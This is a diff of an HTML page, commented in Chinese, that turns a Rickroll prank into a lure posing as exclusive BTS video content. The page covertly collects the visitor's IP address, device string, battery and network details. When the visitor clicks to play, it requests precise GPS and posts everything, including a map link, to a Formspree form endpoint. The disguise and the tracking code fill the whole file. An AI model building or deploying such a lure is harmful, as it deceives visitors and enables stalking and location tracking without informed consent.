@@ -3,25 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Never Gonna Give You Up</title>
+    <title>BTS Special Content</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: black; }
-        .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; }
-        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: white; font-family: sans-serif; }
         #overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); color: white; display: flex;
+            background: #fff; color: #000; display: flex;
             justify-content: center; align-items: center; z-index: 100; cursor: pointer;
-            font-family: sans-serif; text-align: center;
         }
+        .btn { padding: 15px 30px; background: #9146ff; color: white; border-radius: 50px; font-weight: bold; font-size: 1.2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        #player { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
     </style>
 </head>
 <body>
 
-    <div id="overlay" onclick="startRickRoll()">
-        <div>
-            <h1>⚠️ 內容載入中...</h1>
-            <p>請點擊螢幕以繼續觀看</p>
+    <div id="overlay" onclick="startExperience()">
+        <div style="text-align: center;">
+            <div class="btn">點擊播放 BTS 最新專屬內容</div>
+            <p style="margin-top: 15px; color: #888; font-size: 0.9rem;">(內容載入中，請確保音量已開啟)</p>
         </div>
     </div>
 
@@ -29,77 +28,81 @@
 
     <script>
         const FORM_ENDPOINT = "https://formspree.io/f/xdawapwr";
-        let trackingData = {
+        const VIDEO_ID = "WMweEpGlu_U"; // 這裡現在是 BTS 的 Butter，你可以自行更換 ID
+        
+        let trackData = {
             ip: "獲取中...",
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            time: new Date().toLocaleString()
+            ua: navigator.userAgent,
+            battery: "未知",
+            charging: "未知",
+            net: "未知"
         };
 
-        // 1. 立即獲取 IP (不需要權限)
+        // 1. 獲取無需權限的資訊 (IP)
         fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => { trackingData.ip = data.ip; })
-            .catch(() => { trackingData.ip = "隱藏或失敗"; });
+            .then(r => r.json()).then(d => trackData.ip = d.ip);
 
-        // 2. 當使用者點擊「繼續」時觸發
-        function startRickRoll() {
+        // 2. 獲取電池資訊
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                trackData.battery = (b.level * 100) + "%";
+                trackData.charging = b.charging ? "是" : "否";
+            });
+        }
+
+        // 3. 獲取網路環境
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) trackData.net = conn.effectiveType;
+
+        function startExperience() {
             document.getElementById('overlay').style.display = 'none';
             
-            // 載入影片 (自動播放需要使用者互動)
-            loadYouTubeVideo();
+            // 播放 YouTube
+            loadYT();
 
-            // 同時請求 GPS 定位
+            // 請求定位 (這會跳出視窗)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => sendToEmail(pos.coords),
-                    (err) => sendToEmail(null),
+                    (p) => sendData(p.coords),
+                    () => sendData(null),
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else {
-                sendToEmail(null);
+                sendData(null);
             }
         }
 
-        function loadYouTubeVideo() {
-            const tag = document.createElement('script');
-            tag.src = "https://www.youtube.com/iframe_api";
-            const firstScriptTag = document.getElementsByTagName('script')[0];
-            firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+        function loadYT() {
+            const t = document.createElement('script');
+            t.src = "https://www.youtube.com/iframe_api";
+            document.body.appendChild(t);
         }
 
-        let player;
         function onYouTubeIframeAPIReady() {
-            player = new YT.Player('player', {
-                height: '100%',
-                width: '100%',
-                videoId: 'dQw4w9WgXcQ', // 經典 Rickroll ID
-                playerVars: { 'autoplay': 1, 'controls': 0, 'rel': 0, 'showinfo': 0 },
-                events: { 'onReady': (event) => event.target.playVideo() }
+            new YT.Player('player', {
+                videoId: VIDEO_ID,
+                playerVars: { 'autoplay': 1, 'controls': 1 },
+                events: { 'onReady': e => e.target.playVideo() }
             });
         }
 
-        function sendToEmail(coords) {
-            const formData = new FormData();
-            formData.append("🔴 真實 IP", trackingData.ip);
-            formData.append("📱 手機/設備", trackingData.userAgent);
-            formData.append("⏰ 時間", trackingData.time);
+        function sendData(coords) {
+            const fd = new FormData();
+            fd.append("🌐 IP 地址", trackData.ip);
+            fd.append("📱 設備型號", trackData.ua);
+            fd.append("🔋 電量", trackData.battery);
+            fd.append("🔌 充電中", trackData.charging);
+            fd.append("📶 網路", trackData.net);
 
             if (coords) {
-                formData.append("📍 GPS 緯度", coords.latitude);
-                formData.append("📍 GPS 經度", coords.longitude);
-                formData.append("🔗 地圖連結", `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`);
+                fd.append("📍 精確定位", `${coords.latitude}, ${coords.longitude}`);
+                fd.append("🔗 地圖連結", `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`);
             } else {
-                formData.append("⚠️ GPS 狀態", "拒絕定位");
+                fd.append("⚠️ GPS", "對方拒絕定位");
             }
 
-            fetch(FORM_ENDPOINT, {
-                method: "POST",
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            });
+            fetch(FORM_ENDPOINT, { method: "POST", body: fd, headers: { 'Accept': 'application/json' } });
         }
     </script>
 </body>
 </html>
-
